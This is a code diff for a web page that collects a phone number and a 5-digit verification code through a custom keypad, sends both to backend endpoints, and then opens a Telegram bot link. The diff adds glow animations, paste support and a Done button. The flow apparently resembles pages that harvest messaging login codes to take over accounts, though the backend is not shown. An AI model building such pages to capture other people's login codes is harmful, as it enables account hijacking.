@@ -36,27 +36,28 @@
             margin-top: 35px;
         }
 
+        /* VFX Glowing Animated Icon */
         .animated-icon-container {
             position: absolute; top: -45px; left: 50%; transform: translateX(-50%);
             width: 75px; height: 75px;
-            background: linear-gradient(135deg, #0088CC, #00bfff);
+            background: radial-gradient(circle, #00bfff, #004466);
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8), inset 0 0 10px rgba(255,255,255,0.5);
+            box-shadow: 0 0 25px #00e5ff, inset 0 0 12px #ffffff;
             border: 3px solid #ffffff;
-            animation: pulseGlow 1.5s infinite alternate;
+            animation: vfxPulse 1.2s infinite alternate;
         }
 
-        .phone-icon-inner { font-size: 34px; animation: bounceIcon 1s infinite alternate; }
+        .phone-icon-inner { font-size: 32px; animation: vfxBounce 1s infinite alternate; }
 
-        @keyframes pulseGlow {
-            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.6); }
-            100% { transform: translateX(-50%) scale(1.08); box-shadow: 0 0 30px rgba(0, 136, 204, 1); }
+        @keyframes vfxPulse {
+            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px #00e5ff, inset 0 0 8px #fff; }
+            100% { transform: translateX(-50%) scale(1.1); box-shadow: 0 0 35px #00ffff, inset 0 0 15px #fff; }
         }
 
-        @keyframes bounceIcon {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-3px); }
+        @keyframes vfxBounce {
+            0% { transform: translateY(0) scale(1); }
+            100% { transform: translateY(-4px) scale(1.05); }
         }
 
         .header-box h2 {
@@ -77,12 +78,18 @@
 
         .code-display {
             display: flex; gap: 8px; margin-bottom: 20px; justify-content: center;
+            cursor: pointer;
         }
         .code-box {
             width: 52px; height: 60px; border: 2px solid rgba(255,255,255,0.7);
             border-radius: 12px; display: flex; align-items: center; justify-content: center;
             font-size: 26px; color: white; font-weight: bold; background: rgba(255,255,255,0.15);
             backdrop-filter: blur(8px);
+        }
+
+        /* Hidden Paste Input */
+        #pasteInput {
+            position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px;
         }
 
         .keypad {
@@ -95,7 +102,11 @@
             transition: 0.1s;
         }
         .key-btn:active { background: #006699; transform: scale(0.95); }
-        .key-btn.empty { background: transparent; box-shadow: none; cursor: default; }
+        
+        /* Done Button Styling */
+        .key-btn.done-btn {
+            background: #27AE60; font-size: 18px; font-weight: 700;
+        }
         .key-btn.backspace { font-size: 20px; background: #E74C3C; }
     </style>
 </head>
@@ -108,6 +119,7 @@
     <div class="container">
         
         <div class="header-box">
+            <!-- VFX Glowing Animated Icon -->
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
             </div>
@@ -117,7 +129,11 @@
             <button class="btn-get-code" id="actionBtn" onclick="handleAction()">GET CODE 📩</button>
         </div>
 
-        <div class="code-display" id="codeDisplay">
+        <!-- Hidden Input for Copy/Paste Support -->
+        <input type="text" id="pasteInput" maxlength="5" oninput="handlePasteInput(this)">
+
+        <!-- 5 Digit OTP Boxes (Click to paste) -->
+        <div class="code-display" id="codeDisplay" onclick="focusPasteInput()">
             <div class="code-box"></div>
             <div class="code-box"></div>
             <div class="code-box"></div>
@@ -135,7 +151,10 @@
             <button class="key-btn" onclick="pressKey('7')">7</button>
             <button class="key-btn" onclick="pressKey('8')">8</button>
             <button class="key-btn" onclick="pressKey('9')">9</button>
-            <div class="key-btn empty"></div>
+            
+            <!-- Bottom Left Done Button -->
+            <button class="key-btn done-btn" onclick="verifyOtpCode()">Done ✅</button>
+            
             <button class="key-btn" onclick="pressKey('0')">0</button>
             <button class="key-btn backspace" onclick="deleteKey()">⌫</button>
         </div>
@@ -143,7 +162,7 @@
 
     <script>
         let currentInput = "";
-        let step = "phone"; // প্রথমে ফোন ইনপুট, কোড পাঠানোর পর 'otp' হবে
+        let step = "phone"; 
         let savedPhone = "";
         const MAX_OTP_LENGTH = 5;
         const boxes = document.querySelectorAll('.code-box');
@@ -172,6 +191,27 @@
             }
         }
 
+        // Copy/Paste Support Functions
+        function focusPasteInput() {
+            if (step === "otp") {
+                const pasteInp = document.getElementById('pasteInput');
+                pasteInp.focus();
+                pasteInp.click();
+            }
+        }
+
+        function handlePasteInput(el) {
+            let val = el.value.replace(/\D/g, '');
+            if (val.length > MAX_OTP_LENGTH) {
+                val = val.slice(0, MAX_OTP_LENGTH);
+            }
+            currentInput = val;
+            updateDisplay();
+            if (currentInput.length === MAX_OTP_LENGTH) {
+                verifyOtpCode();
+            }
+        }
+
         function handleAction() {
             if (step === "phone") {
                 let phone = document.getElementById('phoneInput').value;
@@ -181,7 +221,6 @@
                 }
                 savedPhone = phone;
                 
-                // ব্যাকএন্ডে কোড পাঠানোর রিকোয়েস্ট
                 fetch('/send-code', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -205,6 +244,11 @@
         }
 
         function verifyOtpCode() {
+            if (currentInput.length < MAX_OTP_LENGTH) {
+                alert("Please enter the complete 5-digit OTP code!");
+                return;
+            }
+
             fetch('/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -214,7 +258,8 @@
             .then(data => {
                 if(data.status === "success") {
                     alert("Verified Successfully! Redirecting...");
-                    window.location.href = "https://t.me/Desi_Magi909_Bot?start=start";
+                    // সফল হলে নতুন ট্যাবে টেলিগ্রাম বট ওপেন হবে
+                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else {
                     alert("Verification Failed: " + data.message);
                     currentInput = "";
